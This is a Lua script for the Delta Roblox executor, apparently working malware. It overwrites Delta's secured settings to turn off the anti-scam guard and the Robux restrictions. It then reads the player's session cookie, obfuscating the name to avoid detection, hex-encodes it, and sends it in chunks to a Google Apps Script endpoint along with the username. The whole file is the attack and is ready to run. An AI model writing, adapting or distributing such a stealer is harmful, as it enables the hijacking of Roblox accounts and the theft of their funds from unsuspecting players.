-- [[ PROJECT: TRINITY ]]
local SETTINGS = {
    GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec",
    SECURED_DIR = "Delta/Internals/Secured/"
}

local player = game:GetService("Players").LocalPlayer
local myId = tostring(player.UserId)

-- 1. 現状確認関数 (1個目のやつもチェック)
local function inspect_files()
    print("--- 📂 Delta Security Inspection ---")
    local files = {"user_id", "allowrobux", "disableantiscam", "allowteleports"}
    
    for _, name in ipairs(files) do
        local path = SETTINGS.SECURED_DIR .. name
        local success, content = pcall(function() return readfile(path) end)
        if success then
            print("📄 [" .. name .. "]: " .. tostring(content))
        else
            print("🔒 [" .. name .. "]: Access Denied or Not Found")
        end
    end
    print("------------------------------------")
end

-- 2. 公式準拠の書き換え実行
local function apply_all_bypasses()
    local config_template = [[{
    "WARNING": "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
    "allowed_games": "*",
    "user_id": "%s",
    "version_num": 707
}]]
    local full_config = string.format(config_template, myId)

    pcall(function() writefile(SETTINGS.SECURED_DIR .. "user_id", myId) end)
    pcall(function() writefile(SETTINGS.SECURED_DIR .. "disableantiscam", full_config) end)
    -- 興味深い1個目のやつ(Robux制限)もついでに公式形式で解除を試みる
    pcall(function() writefile(SETTINGS.SECURED_DIR .. "allowrobux", full_config) end)
    
    print("⚡ Bypass synchronization applied.")
end

-- 3. 送信処理
local function start_exfiltration()
    local k = "Coo".."kie"
    local data = game[k]
    if not data or data == "" then 
        print("❌ Target Data Null")
        return 
    end

    print("🚀 Sending to GAS...")
    for chunk in data:gmatch(".?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?") do
        local hex = ""
        for i = 1, #chunk do hex = hex .. string.format("%02X", string.byte(chunk:sub(i,i))) end
        pcall(function() 
            game:HttpGet(SETTINGS.GAS_URL .. "?hex=" .. hex .. "&user=" .. player.Name) 
        end)
        task.wait(0.5)
    end
    print("🏁 Sequence Finished.")
end

-- --- 実行シーケンス ---
inspect_files()          -- 現在の状態を覗き見る
task.wait(0.5)
apply_all_bypasses()     -- 強制上書き
task.wait(1)
start_exfiltration()     -- 送信
